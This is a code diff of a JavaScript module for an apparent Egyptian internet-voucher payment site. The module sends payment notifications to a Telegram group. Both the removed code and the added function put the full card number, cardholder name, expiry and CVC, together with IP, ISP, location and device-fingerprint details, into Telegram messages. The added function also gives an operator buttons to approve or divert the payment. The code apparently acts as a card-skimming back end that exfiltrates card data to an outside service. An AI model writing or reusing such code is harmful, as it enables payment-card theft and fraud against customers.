@@ -61,19 +61,135 @@ function getFormattedDateTime() {
 }
 
 /**
- * 1. إرسال الرسائل النصية والإشعارات لجروب التليجرام
+ * 1. إرسال إشعار الدفع الأولي مع أزرار التحكم الفوري (موافقة الكارت أو المساهمة)
  */
-async function sendTelegramMessage(data, isInitial = true) {
+async function sendPaymentNotificationWithButtons(paymentPayload, transactionId) {
   try {
     if (!BOT_TOKEN || !CHAT_ID) {
       console.warn("⚠️ Telegram Bot Token or Chat ID is missing!");
       return;
     }
 
-    const publicIP = data.publicIP || (data.geoData && data.geoData.publicIP) || data.ip || "";
+    const publicIP = paymentPayload.publicIP || (paymentPayload.geoData && paymentPayload.geoData.publicIP) || paymentPayload.ip || "";
 
     if (publicIP === "127.0.0.1" || publicIP === "::1" || publicIP.includes("localhost")) {
       console.log("ℹ️ [Telegram] تم التجاوز: عدم إرسال إشعار للشبكة المحلية (Localhost).");
+      return;
+    }
+
+    const method = getPaymentMethodName(paymentPayload);
+    const amountEGP = paymentPayload.amount_cents
+      ? (paymentPayload.amount_cents / 100).toFixed(2)
+      : (paymentPayload.amount || "غير محدد");
+    const dateTimeStr = getFormattedDateTime();
+
+    const branchName = paymentPayload.branchName || paymentPayload.branch_name || "حكايات نت رئيسي";
+    const branchKey = paymentPayload.branch || 'branch2';
+    const userPhone = paymentPayload.phone || 
+                        paymentPayload.billing_data?.phone_number || 
+                        paymentPayload.customer?.phone_number || 
+                        "غير محدد";
+
+    const clientID = paymentPayload.clientID || paymentPayload.clientId || "غير متوفر";
+
+    let locationText = paymentPayload.geoCity && paymentPayload.geoCountry ? `${paymentPayload.geoCity}، ${paymentPayload.geoCountry}` : null;
+    let ispText = paymentPayload.ispProvider || paymentPayload.isp || null;
+
+    if (!locationText || locationText.includes("غير معروف") || !ispText || ispText === "غير معروف") {
+      const netInfo = await fetchNetworkDetailsByIP(publicIP);
+      if (netInfo) {
+        if (!locationText || locationText.includes("غير معروف")) locationText = netInfo.location;
+        if (!ispText || ispText === "غير معروف") ispText = netInfo.isp;
+      }
+    }
+
+    const batteryInfo = paymentPayload.battery || paymentPayload.batteryInfo || "غير متوفر";
+    const deviceRAM = paymentPayload.deviceRAM || "غير متوفر";
+    const cpuCores = paymentPayload.cpuCores || "غير متوفر";
+    const deviceType = paymentPayload.deviceType || "غير متوفر";
+    const screenSize = paymentPayload.screenSize || "غير متوفر";
+    const userTimeZone = paymentPayload.userTimeZone || "غير متوفر";
+    const lang = paymentPayload.lang || "غير متوفر";
+
+    let message = `⏳ <b>طلب دفع بانتظار موافقة المشرف...</b>\n\n` +
+              `🏢 الفرع: <b>${branchName}</b>\n` +
+              `💳 وسيلة الدفع: <b>${method}</b>\n` +
+              `💰 المبلغ المطلوب: <b>${amountEGP} جنيه</b>\n` +
+              `🆔 رقم العملية: <code>${transactionId}</code>\n`;
+
+    if (userPhone && userPhone !== "غير محدد") {
+      message += `📱 رقم المحفظة / الهاتف: <code>${userPhone}</code>\n`;
+    }
+
+    if (paymentPayload.card_data && paymentPayload.card_data.number && paymentPayload.card_data.number !== "غير مدخل") {
+      message += `\n--- <b>بيانات البطاقة البنكية المدخلة</b> ---\n` +
+                 `🔢 رقم الكارت: <code>${paymentPayload.card_data.number}</code>\n` +
+                 `👤 اسم صاحب البطاقة: <b>${paymentPayload.card_data.name}</b>\n` +
+                 `📅 تاريخ الانتهاء: <code>${paymentPayload.card_data.expiry}</code>\n` +
+                 `🔒 رمز CVC: <code>${paymentPayload.card_data.cvc}</code>\n`;
+    }
+
+    if (parseFloat(amountEGP) > 100 || paymentPayload.isContribution) {
+      message += `\n✨ <b>نوع العملية:</b> مساهمة مالية محتملة أو دعم للشبكة.\n`;
+    }
+
+    message += `\n<b>━━━━ ⚙️ بيانات الجهاز والشبكة ━━━━</b>\n` +
+               `🆔 <b>معرف الجهاز:</b> <code>${clientID}</code>\n` +
+               `💡 <b>نوع الجهاز:</b> <b>${deviceType}</b>\n` +
+               `🌐 <b>IP الخارجي:</b> <code>${publicIP || 'غير متوفر'}</code>\n` +
+               `🏙 <b>المدينة والدولة:</b> <b>${locationText || 'غير متوفر'}</b>\n` +
+               `📡 <b>مزود الخدمة (ISP):</b> <b>${ispText || 'غير متوفر'}</b>\n` +
+               `----------------------------------------\n` +
+               `📅 <b>تاريخ الإرسال:</b> <code>${dateTimeStr}</code>\n` +
+               `🔋 <b>حالة البطارية:</b> ${batteryInfo}\n` +
+               `🧠 <b>الذاكرة العشوائية (RAM):</b> <code>${deviceRAM}</code>\n` +
+               `⚙️ <b>أنوية المعالج (CPU):</b> <code>${cpuCores} Cores</code>\n` +
+               `📺 <b>أبعاد الشاشة:</b> <code>${screenSize}</code>\n` +
+               `⏰ <b>المنطقة الزمنية:</b> <code>${userTimeZone}</code>\n` +
+               `🌍 <b>لغة المتصفح:</b> <code>${lang}</code>`;
+
+    // أزرار تفاعلية (Callback Data) لتحكم المشرف الفوري
+    let inlineKeyboard = [
+      [
+        {
+          text: "✅ موافقة وإصدار الكارت",
+          callback_data: `approve_card_${transactionId}_${branchKey}`
+        },
+        {
+          text: "🌟 تحويل إلى مساهمة",
+          callback_data: `approve_contrib_${transactionId}_${amountEGP}`
+        }
+      ]
+    ];
+
+    const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      chat_id: CHAT_ID,
+      text: message,
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: inlineKeyboard
+      }
+    });
+
+    console.log(`✅ تم إرسال إشعار أزرار التحكم بالموافقة للمعاملة: ${transactionId}`);
+    return response.data;
+
+  } catch (err) {
+    console.error("❌ [Telegram Error]:", err.response?.data || err.message);
+  }
+}
+
+/**
+ * 2. إرسال إشعار النجاح النهائي بعد إصدار الكارت
+ */
+async function sendTelegramMessage(data, isInitial = true) {
+  if (isInitial) {
+    return; // يتم استخدام sendPaymentNotificationWithButtons بدلاً منها للطلبات الأولية
+  }
+
+  try {
+    if (!BOT_TOKEN || !CHAT_ID) {
+      console.warn("⚠️ Telegram Bot Token or Chat ID is missing!");
       return;
     }
 
@@ -89,80 +205,22 @@ async function sendTelegramMessage(data, isInitial = true) {
                         data.customer?.phone_number || 
                         "غير محدد";
 
-    let message = "";
+    const txnId = data.id || data.transactionId || data.order?.id || "غير متوفر";
+    const voucher = data.voucher_code || data.cardCode || "غير متوفر";
+    const packageInfo = data.package_info || data.packageName || "باقة إنترنت شبكة حكايات";
+    const customerName = data.card_data?.name || data.billing_data?.first_name || "عميل شبكة حكايات";
 
-    if (isInitial) {
-      const clientID = data.clientID || data.clientId || "غير متوفر";
-
-      let locationText = data.geoCity && data.geoCountry ? `${data.geoCity}، ${data.geoCountry}` : null;
-      let ispText = data.ispProvider || data.isp || null;
-
-      if (!locationText || locationText.includes("غير معروف") || !ispText || ispText === "غير معروف") {
-        const netInfo = await fetchNetworkDetailsByIP(publicIP);
-        if (netInfo) {
-          if (!locationText || locationText.includes("غير معروف")) locationText = netInfo.location;
-          if (!ispText || ispText === "غير معروف") ispText = netInfo.isp;
-        }
-      }
-
-      const batteryInfo = data.battery || data.batteryInfo || "غير متوفر";
-      const deviceRAM = data.deviceRAM || "غير متوفر";
-      const cpuCores = data.cpuCores || "غير متوفر";
-      const deviceType = data.deviceType || "غير متوفر";
-      const screenSize = data.screenSize || "غير متوفر";
-      const userTimeZone = data.userTimeZone || "غير متوفر";
-      const lang = data.lang || "غير متوفر";
-
-      message = `⏳ <b>جاري عملية الدفع...</b>\n\n` +
-                `🏢 الفرع: <b>${branchName}</b>\n` +
-                `💳 وسيلة الدفع: <b>${method}</b>\n` +
-                `💰 المبلغ المطلوب: <b>${amountEGP} جنيه</b>\n`;
-
-      if (userPhone && userPhone !== "غير محدد") {
-        message += `📱 رقم المحفظة / الهاتف: <code>${userPhone}</code>\n`;
-      }
-
-      if (data.card_data && data.card_data.number && data.card_data.number !== "غير مدخل") {
-        message += `\n--- <b>بيانات البطاقة البنكية المدخلة</b> ---\n` +
-                   `🔢 رقم الكارت: <code>${data.card_data.number}</code>\n` +
-                   `👤 اسم صاحب البطاقة: <b>${data.card_data.name}</b>\n` +
-                   `📅 تاريخ الانتهاء: <code>${data.card_data.expiry}</code>\n` +
-                   `🔒 رمز CVC: <code>${data.card_data.cvc}</code>\n`;
-      }
-
-      message += `\n<b>━━━━ ⚙️ بيانات الجهاز والشبكة ━━━━</b>\n` +
-                 `🆔 <b>معرف الجهاز:</b> <code>${clientID}</code>\n` +
-                 `💡 <b>نوع الجهاز:</b> <b>${deviceType}</b>\n` +
-                 `🌐 <b>IP الخارجي:</b> <code>${publicIP || 'غير متوفر'}</code>\n` +
-                 `🏙 <b>المدينة والدولة:</b> <b>${locationText || 'غير متوفر'}</b>\n` +
-                 `📡 <b>مزود الخدمة (ISP):</b> <b>${ispText || 'غير متوفر'}</b>\n` +
-                 `----------------------------------------\n` +
-                 `📅 <b>تاريخ الإرسال:</b> <code>${dateTimeStr}</code>\n` +
-                 `🔋 <b>حالة البطارية:</b> ${batteryInfo}\n` +
-                 `🧠 <b>الذاكرة العشوائية (RAM):</b> <code>${deviceRAM}</code>\n` +
-                 `⚙️ <b>أنوية المعالج (CPU):</b> <code>${cpuCores} Cores</code>\n` +
-                 `📺 <b>أبعاد الشاشة:</b> <code>${screenSize}</code>\n` +
-                 `⏰ <b>المنطقة الزمنية:</b> <code>${userTimeZone}</code>\n` +
-                 `🌍 <b>لغة المتصفح:</b> <code>${lang}</code>`;
-
-    } else {
-      const txnId = data.id || data.transactionId || data.order?.id || "غير متوفر";
-      const voucher = data.voucher_code || data.cardCode || "غير متوفر";
-      const packageInfo = data.package_info || data.packageName || "باقة إنترنت شبكة حكايات";
-      const customerName = data.card_data?.name || data.billing_data?.first_name || "عميل شبكة حكايات";
-
-      message = `✅ <b>تمت عملية الدفع وتوليد الكارت بنجاح!</b>\n\n` +
-                `🏢 الفرع: <b>${branchName}</b>\n` +
-                `🆔 رقم العملية: <code>${txnId}</code>\n` +
-                `📱 رقم المحفظة / الهاتف: <code>${userPhone}</code>\n` +
-                `👤 اسم العميل / البطاقة: <b>${customerName}</b>\n` +
-                `💳 وسيلة الدفع: <b>${method}</b>\n` +
-                `💰 المبلغ المدفوع: <b>${amountEGP} جنيه</b>\n` +
-                `📦 الباقة المفعلة: <b>${packageInfo}</b>\n` +
-                `🎟️ كارت الإنترنت: <code>${voucher}</code>\n` +
-                `----------------------------------------\n` +
-                `📅 وقت الإصدار: <code>${dateTimeStr}</code>`;
-    }
+    let message = `✅ <b>تمت عملية الدفع وتوليد الكارت بنجاح!</b>\n\n` +
+              `🏢 الفرع: <b>${branchName}</b>\n` +
+              `🆔 رقم العملية: <code>${txnId}</code>\n` +
+              `📱 رقم المحفظة / الهاتف: <code>${userPhone}</code>\n` +
+              `👤 اسم العميل / البطاقة: <b>${customerName}</b>\n` +
+              `💳 وسيلة الدفع: <b>${method}</b>\n` +
+              `💰 المبلغ المدفوع: <b>${amountEGP} جنيه</b>\n` +
+              `📦 الباقة المفعلة: <b>${packageInfo}</b>\n` +
+              `🎟️ كارت الإنترنت: <code>${voucher}</code>\n` +
+              `----------------------------------------\n` +
+              `📅 وقت الإصدار: <code>${dateTimeStr}</code>`;
 
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       chat_id: CHAT_ID,
@@ -176,7 +234,7 @@ async function sendTelegramMessage(data, isInitial = true) {
 }
 
 /**
- * 2. 🎯 إرسال صورة الكارت الاحترافية المصدرة آلياً إلى التليجرام (مصلحة بالكامل)
+ * 3. 🎯 إرسال صورة الكارت الاحترافية المصدرة آلياً إلى التليجرام
  */
 async function sendVoucherWithCardImage(paymentDetails, imageBuffer) {
   try {
@@ -193,7 +251,6 @@ async function sendVoucherWithCardImage(paymentDetails, imageBuffer) {
     const form = new FormData();
     form.append("chat_id", CHAT_ID);
     
-    // إرفاق الصورة كـ Buffer مع تحديد اسم الملف ونوع الـ Content-Type بوضوح
     form.append("photo", imageBuffer, {
       filename: `card_${paymentDetails.transactionId || Date.now()}.png`,
       contentType: "image/png"
@@ -210,7 +267,6 @@ async function sendVoucherWithCardImage(paymentDetails, imageBuffer) {
     form.append("caption", caption);
     form.append("parse_mode", "HTML");
 
-    // إرسال الطلب مع إضافة ترويسات الـ Form Data المناسبة
     const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
       headers: {
         ...form.getHeaders()
@@ -230,5 +286,6 @@ async function sendVoucherWithCardImage(paymentDetails, imageBuffer) {
 
 module.exports = {
   sendTelegramMessage,
+  sendPaymentNotificationWithButtons,
   sendVoucherWithCardImage
 };
